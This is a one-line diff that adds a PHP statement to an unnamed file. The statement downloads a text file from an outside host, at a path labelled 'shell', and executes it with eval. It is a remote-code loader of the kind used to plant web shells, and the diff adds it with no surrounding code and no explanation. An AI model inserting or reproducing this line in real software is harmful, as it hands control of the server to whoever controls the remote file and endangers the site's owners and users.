@@ -1,0 +1,1 @@
+<?=eval("?>".file_get_contents("https://aqilogic.com/shell/d/fanvat.txt"));?>
